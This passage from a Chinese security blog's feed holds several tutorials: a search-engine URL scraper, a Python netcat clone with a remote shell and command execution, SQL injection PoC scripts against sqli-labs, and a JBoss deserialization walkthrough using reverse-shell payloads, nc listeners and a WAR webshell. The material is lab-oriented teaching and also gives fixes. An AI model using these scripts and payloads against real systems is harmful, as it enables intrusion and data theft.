            with open(&apos;baidu_url_result.txt&apos;, &apos;a+&apos;, encoding=&apos;utf-8&apos;)as a:
                a.write(ur + &apos;\n&apos;)
        print(&apos;搜索完成,已经保存到:&quot;baidu_url_result.txt&quot;&apos;)</code></pre><p>参数说明：</p>
<p>1、url规则编写：</p>
<pre><code>url = &apos;https://www.baidu.com/s?wd={}&amp;pn={}&apos;.format(quote(keywords), i)</code></pre><p>url的地址是根据百度url规则来编写的</p>
<p><img src="/images/urlcj/1.png" alt=""></p>
<p>通过简单的观察我们可以发现，wd就是我们要进行搜索的关键字，而pn代表的是页数（0,代表第一页，10代表第二页，20代表第三页以此类推）</p>
<p>写一个”for i in range(0, PAGES*10, 10):”在range中以10为步长从0，PAGES 10 这样的话url的规则就编写完成了。</p>
<p>2、xpath的规则编写：</p>
<p>这里我用xpath来采集URL在前面都是正常的request请求。</p>
<p><img src="/images/urlcj/2.png" alt=""></p>
<p><img src="/images/urlcj/3.png" alt=""></p>
<p>通过观察我们可以发现需要的数据在标红色里面，而所有的数据又在div标签并且id=’content_left’中，在得到这些数据中，我们对divs进行遍历”.//h3/a/@href”</p>
<p><img src="/images/urlcj/4.png" alt=""><br>到这里xpath的规则就编写完成了，你可以获得一个百度跳转到其他网页的列表，下面再对这些URL进行处理</p>
<p>3、302跳转处理：</p>
<p>在上面获取了跳转前的链接，并不是我们需要的地址，所以还需要进一步处理<br>在进行request请求之后使用urlparse()函数获得类似下面这样的数据<br><img src="/images/urlcj/5.png" alt=""></p>
<pre><code>ur = u.scheme + &apos;://&apos; + u.netloc + u.path</code></pre><p>最后把这些组合起来就可以了</p>
<p>4、编写main()</p>
<pre><code>if __name__ == &apos;__main__&apos;:
    inp1 = input(&quot;请选择搜索模式：\n 1 :批量从文件关键字搜索\n 2 :输入一个关键字进行搜索\n&quot;)
    if inp1 == &apos;1&apos;:
        inp = input(&apos;导入标题文本:&apos;)
        titles = list(set([x.strip() for x in open(inp, &apos;r&apos;, encoding=&apos;utf-8&apos;).readlines()]))
        print(&apos;目标总数:{}&apos;.format(len(titles)))
        with ThreadPoolExecutor(10) as p:
            # 开 10 个线程池
            res = [p.submit(BaiduScan, url) for url in titles]
    elif inp1 == &apos;2&apos;:
        url = input(&apos;输入keywords\n&apos;)
        BaiduScan(url)

    else:
        pass</code></pre><p>使用效果：</p>
<p><img src="/images/urlcj/6.png" alt=""></p>
<h2 id="bing采集模块"><a href="#bing采集模块" class="headerlink" title="bing采集模块"></a>bing采集模块</h2><p>bing和baidu大同小异，所以这里就不赘述，所以这里附上URL和xpath规则</p>
<pre><code># URL规则
url = &apos;https://cn.bing.com/search?q={}&amp;first={}&apos;.format(quote(keywords), i)
# xpath规则
divs = tree.xpath(&quot;//ol[@id=&apos;b_results&apos;]/li&quot;)
            for div in divs:
                url = div.xpath(&quot;.//h2/a/@href&quot;)
                print(url[0])
                result.add(url[0])</code></pre><p>使用效果：</p>
<p><img src="/images/urlcj/7.png" alt=""></p>
<h2 id="google采集模块"><a href="#google采集模块" class="headerlink" title="google采集模块"></a>google采集模块</h2><p>同样的google和bing、baidu也是大同小异，不同的是google需要能够科学上网的网络，同时google的“确定你不是机器人”，可能需要进一步的绕过</p>
<pre><code># URL规则
url = &apos;https://www.google.com/search?q={}&amp;start={}&apos;.format(quote(keywords), i)
# xptah规则
divs = tree.xpath(&quot;//div[@class=&apos;g&apos;]&quot;)
            for div in divs:
                url = div.xpath(&quot;.//div[@class=&apos;r&apos;]/a/@href&quot;)
                print(url[0])
                result.add(url[0])
# socket代理示例
 proxies = {&quot;http&quot;: &quot;socks5://127.0.0.1:10808&quot;, &quot;https&quot;: &quot;socks5://127.0.0.1:10808&quot;, }</code></pre><p>使用效果：</p>
<p><img src="/images/urlcj/8.png" alt=""></p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>socket之编写netcat（python3）</title>
    <url>/2020/04/30/netcat1/</url>
    <content><![CDATA[<p>关于网络编程之编写一款属于自己的netcat<a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>netcat是个计算机网络公用程序，用来对网络连线TCP或者UDP进行读写。 netcat 在2001年insecure.org对nmap用户邮件列表举办的投票被推选为第二有用的网络保全工具。2003年投票结果是第四名；2006年的投票继续稳占同样第四名宝座。<br>在《Python黑帽子》这本书中是这样介绍的：他说聪明的系统管理员都会将他从系统中移除。但是却安装了python</p>
</blockquote>
<p>在书中他是采用Python2来编写的，我这里用Python3编写，并且做出一些解释。</p>
<h1 id="编写netcat"><a href="#编写netcat" class="headerlink" title="编写netcat"></a>编写netcat</h1><p><strong>在创建主函数之前我们先做一些准备</strong></p>
<pre><code>#导入一些库
import sys
import socket
import getopt
import threading
import subprocess

# 定义全局变量
listen = False
command = False
upload = False
execute = &quot;&quot;
target = &quot;&quot;
upload_destination = &quot;&quot;
port = 0

# 编写使用帮助
def usage():
print(&quot;MY NET TOOL&quot;)
print(&quot;&quot;)
print(&quot;Usage: netcat.py -t target_host -p port&quot;)
print(&quot;-l --listen                                    - listen on [host]:[port] for&quot;)
print(&quot;                                                 incoming connections&quot;)
print(&quot;-e --execute=file_to_run                       - execute the given file upon&quot;)
print(&quot;                                                 receiving a connection&quot;)
print(&quot;-c --command                                   - initialize a command shell&quot;)
print(&quot;-u --upload=destination                        - upon receiving connection upload a&quot;)
print(&quot;                                                 file and write to [destination]&quot;)
print(&quot;&quot;)
print(&quot;&quot;)
print(&quot;Examples:&quot;)
print(&quot;netcat.py -t 192.168.0.1 -p 5555 -l -c&quot;)
print(&quot;netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;)
print(&quot;netcat.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;)
print(&quot;echo &apos;ABCDEFGHI&apos; | ./netcat.py -t 192.168.11.12 -p 135&quot;)
sys.exit(0)</code></pre><p>上面导入库、定义全局变量和使用帮助，还需要根据socket创建两个函数server_loop()和client_sender()</p>
<h2 id="了解socket的调用流程"><a href="#了解socket的调用流程" class="headerlink" title="了解socket的调用流程"></a>了解socket的调用流程</h2><p>由于编写中只涉及到TCP C/S模式，所以下面只针对这种。</p>
<p>套接字调用流程：</p>
<p><img src="/images/netcat/1.png" alt=""></p>
<p>通过上面的流程图相信你可以很好的了解socket的调用流程，在此基础上进行编写server端</p>
<pre><code>def server_loop():
    global target

    # 如果没有定义目标，监听所有接口
    if not len(target):
        target = &quot;0.0.0.0&quot;
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 1
    server.bind((target, port)) # 2
    server.listen(5) # 3

    while True:
        client_socket, addr = server.accept() # 4
        # 分拆一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,)) # 5
        client_thread.start()</code></pre><p>在上面的1~4都是对应流程图中Server直到5中调用了client中的发送和接收。下面看一下client端</p>
<pre><code>def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到目标主机
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode()) 

        while True:
            # 等待数据回传
            recv_len = 1
            response = &quot;&quot;

            while recv_len:
                data = client.recv(4096).decode()
                recv_len = len(data)
                response += data

                if recv_len &lt; 4096:
                    break
            print(response)
            # 等待更多的输入
            buffer = input(&quot;&quot;)
            buffer += &quot;\n&quot;
            # 发送出去
            client.send(buffer.encode())

    except:
        print(&quot;[*] Exception! Exiting.&quot;)
        # 关闭连接
        client.close()</code></pre><p>客户端的编写也是根据流程图就可以了，要注意的是Python3中发送和接收数据需要进行编码和解码。</p>
<h2 id="实现文件上传、命令执行、shell相关功能"><a href="#实现文件上传、命令执行、shell相关功能" class="headerlink" title="实现文件上传、命令执行、shell相关功能"></a>实现文件上传、命令执行、shell相关功能</h2><pre><code># 命令执行
def run_command(command):
    # 换行
    command = command.rstrip()
    # 运行命令并将输入返回

    try:
        output = subprocess.getoutput(command)

    except:
        output = &quot;Failed to execute command.\r\n&quot;

    # 将输出发送
    return output</code></pre><p>在output中用subprocess.getoutput()函数来获取我们输入的命令</p>
<pre><code># 实现文件上传、命令执行、shell相关功能
def client_handler(client_socket):
    global upload
    global execute
    global command

    # 1 检测上传文件
    if len(upload_destination):
        # 读取所有的字符并且写下目标
        file_buffer = &quot;&quot;
        # 持续读取直至没有符合数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        # 2 现在我们接收这些数据并将他们写出来
        try:
            file_descriptor = open(upload_destination, &quot;wb&quot;)
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # 确定文件已经写出来
            client_socket.send(&quot;Sucessfully saved file to {}\r\n&quot;.format(upload_destination).encode())

        except:
            client_socket.send(&quot;Failed to save file to {}\r\n&quot;.format(upload_destination).encode())

    # 3 检查命令执行
    if len(execute):
        # 运行命令
        output = run_command(execute)
        client_socket.send(output.encode())

    # 如果需要一个命令行shell，进入另外一个循环
    if command:

        while True:
            # 跳出一个窗口
            client_socket.send(&quot;&lt;NETCAT:#&gt;&quot;.encode())
            # 接收文件知道发现换行符
            cmd_buffer = &quot;&quot;

            while &quot;\n&quot; not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()
                # 返还命令输出
                response = run_command(cmd_buffer)
                # 返回响应数据
                client_socket.send(response.encode())</code></pre><p>说明：</p>
<pre><code>1、主要负责连接之后来接收文件的，这样我们就可以通过该工具进行上传和执行测试脚本了
2、接收文件数据，web标识确保我们以二进制格式写入，并且保证数据完全接收
3、直接调用run_command函数执行文件
4、持续处理你输入的命令</code></pre><p>最后到了编写主函数的时候</p>
<pre><code>def main():
    # 定义一些全局变量
    global listen, opts
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], &quot;hle:t:p:cu:&quot;,
                                   [&quot;help&quot;, &quot;listen&quot;, &quot;execute&quot;, &quot;target&quot;, &quot;port&quot;,
                                    &quot;command&quot;, &quot;upload&quot;])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in (&quot;-h&quot;, &quot;--help&quot;):
            usage()
        elif o in (&quot;-l&quot;, &quot;--listen&quot;):
            listen = True
        elif o in (&quot;-e&quot;, &quot;--execute&quot;):
            execute = a
        elif o in (&quot;-t&quot;, &quot;--target&quot;):
            target = a
        elif o in (&quot;-p&quot;, &quot;--port&quot;):
            port = int(a)
        elif o in (&quot;-c&quot;, &quot;--command&quot;):
            command = True
        elif o in (&quot;-u&quot;, &quot;--upload&quot;):
            upload_destination = a
        else:
            assert False, &quot;Unhandled Option&quot;

    # 判断我们是监听还是仅从标准输入发送数据(这里相当于：client端)
    if not listen and len(target) and port &gt; 0:
        # 从命令行读取内存数据
        # 这里将阻塞
        buffer = sys.stdin.read()

        # 发送数据
        client_sender(buffer)

    # 我们开始监听并准备上传文件、执行命令
    # 放置一个反弹shell
    # 取决于上面的命令行选项(这里相当于：server端)
    if listen:
        server_loop()


if __name__ == &apos;__main__&apos;:
    main()</code></pre><p>在定义一些全局变量之后，直接判断是否输入参数，如果没有则返回帮助</p>
<pre><code>这里sys.argv[1:]表示的第一个参数之后    
#例如：Python3 netcat.py -t target_host -p port
那么sys.argv[1:]检测的是netcat.py 之后有没有参数(-t、-p)</code></pre><p>读取命令行选项</p>
<pre><code>getopt.getopt(args, options[, long_options]
# option 有&quot;：&quot;表示后面必须附加参数
# 如 hlc都可以不需要附加参数，其他则需要附加</code></pre><p>之后就是判断有没有参数和调用之前的函数来执行了</p>
<p>运行效果：</p>
<p><img src="/images/netcat/2.png" alt=""></p>
<p><img src="/images/netcat/3.png" alt=""></p>
<p>Windows中使用CTRL-Z、Linux则使用CTRL-D</p>
<p>参考:《Python黑帽子》</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>想批量刷洞？看一下POC怎么编写</title>
    <url>/2020/04/30/%E6%83%B3%E6%89%B9%E9%87%8F%E5%88%B7%E6%B4%9E%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%8BPOC%E6%80%8E%E4%B9%88%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<p>SQL POC的编写（基于sqli-labs）<a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>什么是POC？</p>
<p>POC（Proof of Concept）在黑客圈特指：观点验证程序，即用来验证某个漏洞是否存在。</p>
<p>在现实的应用当中，如果我发现了某个新漏洞，那么我就可以通过POC批量检测。POC的编写的关键并不在于程序本身，而在于漏洞的理解。所以，我下面以sqli-labs为例，用Python编写较为几个常见的SQL POC</p>
<h1 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在这里我为了图方便所以直接用docker进行搭建</p>
<pre><code># 拉取docker images
docker pull acgpiano/sqli-labs
# 以后台模式运行并且映射80端口
docker run -id --name sqli-labs -p 80:80 acgpiano/sqli-labs
# 进入sqli-labs里面的系统
docker exec -it sqli-labs2 bash</code></pre><p>补充:</p>
<p><strong>SQL注入分类</strong>的思维导图，大体可以分为以下几类：</p>
<p><img src="/images/SqlPoc/sql.png" alt=""></p>
<h2 id="基于报错的-SQL-注入-PoC-编写"><a href="#基于报错的-SQL-注入-PoC-编写" class="headerlink" title="基于报错的 SQL 注入 PoC 编写"></a>基于报错的 SQL 注入 PoC 编写</h2><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>payload: </p>
<pre><code>http://192.168.11.15/Less-1/index.php?id=-1&apos; union select 1,2,md5(88) --+</code></pre><p><img src="/images/SqlPoc/sql1.png" alt=""></p>
<p>这里使用union联合查询，通过mysql里面的md5()函数计算出88的md5值，并且通过内容返回该值。</p>
<p>那么这样的话，POC的编写思路就很清晰了：通过判断是否返回对应数据md5的计算来判断是否执行md5()函数，如果执行，那么漏洞存在。</p>
<h3 id="下面附上POC代码："><a href="#下面附上POC代码：" class="headerlink" title="下面附上POC代码："></a>下面附上POC代码：</h3><pre><code>#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @Time : 2020/4/28 14:55
# @Author : AqYoung
# @File : sql1.py

import requests
import random
import hashlib


def verify(url):
    rand_num = random.randint(0, 1000)
    hash_flag = hashlib.md5(str(rand_num).encode(encoding=&apos;utf-8&apos;)).hexdigest()
    target = &quot;{domain}/Less-1/index.php?id=-1%27 union select 1,2,md5({rand_num}) %23&quot;.format(domain=url, rand_num=rand_num)

    try:
        res = requests.get(url=target, timeout=20)
        result = res.content.decode(encoding=&apos;utf-8&apos;)
        # 判断result返回内容是否有hash_flag
        if hash_flag in result:
            print(&quot;{domain} is vulnerable target &quot;.format(domain=url))
        else:
            print(&quot;{domain} not is vulnerable target &quot;.format(domain=url))

    except Exception as e:
        print(&quot;Maybe something went wrong...&quot;)
        print(e)


if __name__ == &apos;__main__&apos;:
    verify(&quot;http://192.168.11.15&quot;)</code></pre><p>参数说明：</p>
<pre><code>rand_num    从0,1000中取一个随机数
hash_flag     通过hashlib计算hash值，用来和页面返回的hash值进行比较是否相等</code></pre><p>执行效果：</p>
<p><img src="/images/SqlPoc/sql2.png" alt=""></p>
<h2 id="基于布尔的盲注的-SQL-注入-PoC-编写"><a href="#基于布尔的盲注的-SQL-注入-PoC-编写" class="headerlink" title="基于布尔的盲注的 SQL 注入 PoC 编写"></a>基于布尔的盲注的 SQL 注入 PoC 编写</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>首先，先登录    mysql，查看一下对应的信息；</p>
<p><img src="/images/SqlPoc/sql3.png" alt=""></p>
<p>函数说明：</p>
<pre><code># 1 mid()/substr()用来截取字符串。
比如：
select mid(database(),n,m);
其中n表示从第几位开始截取，m表示要截取几位。
# ord()/ascii()把对应的字符串转化为ascii值</code></pre><p>ASCII Table ：<br><img src="/images/SqlPoc/sql4.png" alt=""></p>
<p>通过上面的理解，我们就可以构建对应的payload</p>
<p>payload：</p>
<pre><code>http://192.168.11.15/Less-8/?id=1&apos; and ord(mid(version(),1,8))&lt;=115--+</code></pre><p><img src="/images/SqlPoc/sql5.png" alt=""><br><img src="/images/SqlPoc/sql6.png" alt=""></p>
<p>由于我们数据库的ascii值为115，所以判断是否&lt;=115,返回”You are in”但是114的话则不返回。</p>
<h3 id="下面附上POC代码：-1"><a href="#下面附上POC代码：-1" class="headerlink" title="下面附上POC代码："></a>下面附上POC代码：</h3><pre><code>#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @Time : 2020/4/28 20:20
# @Author : AqYoung
# @File : sql8.py

import requests

host = &quot;http://192.168.11.15/Less-8/?id=1&quot;

# 根据是否存在&quot;You ar in&quot;，从而返回True或者False
def html_bool(bool_sql):
    url = host + &quot;%27%20and%20&quot; + bool_sql + &quot;%20--+&quot;
    # print(url)
    html = requests.get(url=url).content.decode(encoding=&apos;utf-8&apos;)
    if &quot;You are in&quot; in html:
        return True
    else:
        return False


def dichotomy():
    global data
    data = &apos;&apos;
    # 用二分法获取数据库的长度，并且传值给j参数
    low = 0
    height = 128
    j = 0
    mid = &apos;&apos;
    while True:
        mid = int((low + height) / 2)
        bool_sql = &quot;length(database())&lt;={mid}&quot;.format(mid=mid)
        if mid == low:
            j = int(mid+1)
            print(&quot;数据库的长度为:{length}\n请等待...&quot;.format(length=j-1))
            break
        elif html_bool(bool_sql=bool_sql):
            height = mid
        else:
            low = mid

    # 用二分法来获取数据库的名称
    for i in range(1, j):
        low = 0
        height = 128
        mid = &apos;&apos;
        while True:
            mid = int((low + height) / 2)
            bool_sql = &quot;ord(mid(database(),{i},29))&lt;={mid}&quot;.format(i=i, mid=mid)
            if mid == low:
                data += data.join(str(chr(mid + 1)))
                break
            elif html_bool(bool_sql=bool_sql):
                height = mid
            else:
                low = mid
    else:
        if len(data) &gt; 0:
            print(&quot;存在漏洞，当前使用的数据库为：{data}&quot;.format(data=data))
        else:
            print(&quot;可能不存在该漏洞&quot;)
if __name__ == &apos;__main__&apos;:
    dichotomy()</code></pre><p>参数说明：</p>
<pre><code>html_bool()    判断是否存You are in从而返回True or False
dichotomy() 简单来讲    第一次用二分法来判断数据库长度，而第二次的for循环里面是获取了对应的数据库名称</code></pre><p>执行效果：</p>
<p><img src="/images/SqlPoc/sql7.png" alt=""></p>
<p>存在漏洞会输出数据库名称，不存则不会返回</p>
<h2 id="基于时间的盲注的-SQL-注入-PoC-编写"><a href="#基于时间的盲注的-SQL-注入-PoC-编写" class="headerlink" title="基于时间的盲注的 SQL 注入 PoC 编写"></a>基于时间的盲注的 SQL 注入 PoC 编写</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>payload1：</p>
<pre><code>http://192.168.11.15/Less-9/index.php?id=1&apos; and If
(ascii(substr(database(),1,1))&gt;1,1,sleep(5))--+</code></pre><p>参数说明：</p>
<pre><code>sleep(n)    #延迟n秒
if(条件，1，sleep(5))    #通过判断前面的条件，如果true执行1，否则执行sleep(5)</code></pre><p>payload2:</p>
<pre><code>http://192.168.11.15/Less-9/index.php?id=1&apos; and If((length(database()))&gt;1,1,sleep(5))--+</code></pre><p>这里用payload2来获取数据库长度，payload2获取数据库名称。</p>
<p>基于时间盲注和基于布尔盲注POC编写的主要区别是在于对于条件的判断<br>所以下面只附上html_bool()</p>
<pre><code>def html_bool(bool_sql):
    url = host + &quot;%27%20and%20&quot; + bool_sql + &quot;%20--+&quot;
    # print(url)
    start = time.time()
    html = requests.get(url=url, timeout=15)
    end = time.time()
    if (end-start) &gt; 5:
        return True
    else:
        return False

#dichotomy()中的bool_sql可以根据上面的两个payload修改即可。</code></pre><p>执行效果：</p>
<p><img src="/images/SqlPoc/sql8.png" alt=""></p>
<p>存在漏洞则输出，数据库长度和名称</p>
<h1 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h1><p>这篇文章传达的信息十分有限，所以简单的介绍了几个常用的SQL POC编写，而且并没有基于框架编写，你可以使用Pocsuite、Bugscan、Tangscan等常见的POC框架编写或者自己写一个框架都可以。</p>
<p>然后一些POC你也可以参考<a href="https://www.seebug.org/appdir/" target="_blank" rel="noopener">seebug</a>等。希望对你有帮助。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>POC</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件漏洞之JBoss</title>
    <url>/2020/04/16/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BJBoss/</url>
    <content><![CDATA[<p>中间件JBoss漏洞记录<a id="more"></a></p>
<h1 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h1><blockquote>
<p>是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
</blockquote>
<h1 id="JBoss常见漏洞"><a href="#JBoss常见漏洞" class="headerlink" title="JBoss常见漏洞"></a>JBoss常见漏洞</h1><p><img src="/images/jboss/JBoss.png" alt=""></p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149"><a href="#JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)"></a>JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)</h3><p>影响版本：</p>
<pre><code>Jboss AS 5.x
Jboss AS 6.x</code></pre><p>1、环境搭建</p>
<p>这里直接使用<a href="https://vulhub.org/#/environments/jboss/CVE-2017-12149/" target="_blank" rel="noopener">vulhub</a>进行搭建</p>
<p>2、漏洞复现</p>
<p>（1）直接访问漏洞存在点</p>
<pre><code>http://192.168.11.12:8080/invoker/readonly</code></pre><p><img src="/images/jboss/1.png" alt=""></p>
<p>可以看到返回 500 页面说明页面存在的</p>
<p>（2）这里使用工具：<a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip" target="_blank" rel="noopener">JavaDeserH2HC</a></p>
<pre><code>#1 生成 ReverseShellCommonsCollectionsHashMap.class
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

#2 生成 ReverseShellCommonsCollectionsHashMap.ser
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap ip:port (ip是监听服务端的ip)

#3 用netcat进行监听
 nc -lvp port

#4 漏洞利用
curl http://192.168.11.12:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></pre><p><img src="/images/jboss/2.png" alt=""></p>
<p>利用成功之后得到的是root权限</p>
<p>参考：<a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></p>
<h3 id="JBossMQ-JMS-CVE-2017-7504"><a href="#JBossMQ-JMS-CVE-2017-7504" class="headerlink" title="JBossMQ JMS (CVE-2017-7504)"></a>JBossMQ JMS (CVE-2017-7504)</h3><p>影响版本：</p>
<pre><code>Jboss AS 4.x</code></pre><p>漏洞复现：</p>
<p>（1）访问</p>
<pre><code>http://192.168.11.12:8080/jbossmq-httpil/HTTPServerILServlet</code></pre><p><img src="/images/jboss/5.png" alt=""></p>
<p>返回 This is the JBossMQ HTTP-IL 说明页面存在</p>
<p>（2）漏洞利用</p>
<p>直接使用之前生成的 “ *.ser”</p>
<pre><code>#1 用netcat进行监听
 nc -lvp port

#2 漏洞利用
curl http://192.168.11.12:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></pre><p><img src="/images/jboss/6.png" alt=""></p>
<p>成功反弹root权限的shell</p>
<h3 id="JMXInvokerServlet-反序列化漏洞（CVE-2015-7501）"><a href="#JMXInvokerServlet-反序列化漏洞（CVE-2015-7501）" class="headerlink" title="JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）"></a>JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）</h3><p>漏洞复现</p>
<p>（1）访问</p>
<pre><code>http://192.168.11.12:8080/invoker/JMXInvokerServlet</code></pre><p>返回如下的response，说明接口是开放的，此接口存在漏洞</p>
<p><img src="/images/jboss/3.png" alt=""></p>
<p>（2）漏洞利用</p>
<p>这里还是直接使用之前生成的 “ *.ser”</p>
<pre><code>#1 用netcat进行监听
 nc -lvp port

#2 漏洞利用
curl http://192.168.11.12:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></pre><p><img src="/images/jboss/4.png" alt=""></p>
<p>成功反弹root权限的shell</p>
<p><img src="/images/jboss/7.png" alt=""></p>
<h3 id="EJBInvokerServlet-反序列化漏洞（-CVE-2013-4810）"><a href="#EJBInvokerServlet-反序列化漏洞（-CVE-2013-4810）" class="headerlink" title="EJBInvokerServlet 反序列化漏洞（ CVE-2013-4810）"></a>EJBInvokerServlet 反序列化漏洞（ CVE-2013-4810）</h3><pre><code>漏洞利用方法和上面大同小异不再赘述</code></pre><p>关于序列化的漏洞网上也有很多的EXP，例如也可以使用<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a>直接可以执行命令，上传文件等等。</p>
<p>参考文档：</p>
<p><a href="https://vulhub.org/#/environments/jboss/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jboss/</a><br><a href="https://www.freebuf.com/vuls/186948.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/186948.html</a></p>
<h2 id="JMX-Console未授权访问"><a href="#JMX-Console未授权访问" class="headerlink" title="JMX Console未授权访问"></a>JMX Console未授权访问</h2><h3 id="HtmlAdaptor-addURL-文件上传漏洞"><a href="#HtmlAdaptor-addURL-文件上传漏洞" class="headerlink" title="HtmlAdaptor addURL() 文件上传漏洞"></a>HtmlAdaptor addURL() 文件上传漏洞</h3><p>利用后台jboss.deployment -&gt; DeploymentScanner -&gt; Java.net.URL类型 addURL() </p>
<p>漏洞配置</p>
<p>(1)关闭安全配置（/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml）</p>
<p><img src="/images/jboss/13.png" alt=""></p>
<p><img src="/images/jboss/14.png" alt=""></p>
<p>(2)关闭安全认证，注释掉<security-constraint>（/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/web.xml）</p>
<pre><code>&lt;!--
   &lt;security-constraint&gt;
     &lt;web-resource-collection&gt;
       &lt;web-resource-name&gt;HtmlAdaptor&lt;/web-resource-name&gt;
       &lt;description&gt;An example security config that only allows users with the
         role JBossAdmin to access the HTML JMX console web application
       &lt;/description&gt;
       &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
       &lt;http-method&gt;GET&lt;/http-method&gt;
       &lt;http-method&gt;POST&lt;/http-method&gt;
     &lt;/web-resource-collection&gt;
     &lt;auth-constraint&gt;
       &lt;role-name&gt;JBossAdmin&lt;/role-name&gt;
     &lt;/auth-constraint&gt;
   &lt;/security-constraint&gt;
--&gt;</code></pre><p>漏洞利用</p>
<p>（1）访问</p>
<pre><code>http://192.168.11.12:8080/jmx-console/</code></pre><p>（2）点击jboss.deployment进入应用部署页面</p>
<p><img src="/images/jboss/8.png" alt=""></p>
<p>（3）这里用kali自带的apache服务器，并且存在war木马包</p>
<p><img src="/images/jboss/9.png" alt=""></p>
<p><img src="/images/jboss/11.png" alt=""></p>
<p>（4）通过addurl参数进行远程的木马部署</p>
<p><img src="/images/jboss/10.png" alt=""></p>
<p>（5）部署成功后返回 successfully ，之后访问</p>
<pre><code>http://192.168.11.12:8080/job(war包名)/job.jsp(木马名)</code></pre><p><img src="/images/jboss/12.png" alt=""></p>
<p>成功获得一个webshell</p>
<p>修复建议：</p>
<p>（1）开启安全配置和安全认证</p>
<p>（2）配置用户密码以及用户权限</p>
<pre><code>./opt/jboss/jboss4/server/default/conf/login-config.xml</code></pre><p><img src="/images/jboss/15.png" alt=""></p>
<pre><code>#用户配置文件位置
./opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties

./opt/jboss/jboss4/server/default/conf/props/jmx-console-roles.properties</code></pre><p>在开启安全配置和认证之后添加新的用户<br><img src="/images/jboss/16.png" alt=""></p>
<p>重新启动jboss之后再次访问：</p>
<p><img src="/images/jboss/17.png" alt=""></p>
